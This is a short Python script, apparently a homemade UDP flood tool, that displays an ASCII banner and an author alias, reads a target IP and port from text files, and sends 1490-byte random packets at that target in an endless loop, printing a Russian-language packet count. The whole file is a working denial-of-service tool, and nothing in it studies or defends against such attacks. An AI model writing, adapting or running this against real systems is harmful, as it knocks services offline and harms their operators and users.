import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
from colorama import init, Fore, Back, Style
init()
def console_picture():
    print(Style.BRIGHT + Fore.YELLOW)
    print("                **    **  ********  **        **            **      ")
    print("               **    **  ********  **        **         **     **   ")
    print("              ********  **        **        **         **      **  ")
    print("             ********  ********  **        **         **      **  ")
    print("            **    **  **        **        **         **      **  ")
    print("           **    **  ********  ********  ********    **    **   ")
    print("          **    **  ********  ********  ********       **      ")
console_picture()
print("Author Anonimus 'LegindarySiDay'")
time.sleep(5)
ip1 = open('ip.txt')
port1 = open('port.txt')
ip = ip1.read()
port = int(port1.read())
sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     if sent % 10000 == 0:
       print("мы уже послали ровно",sent, "пакетов" ,ip,port)
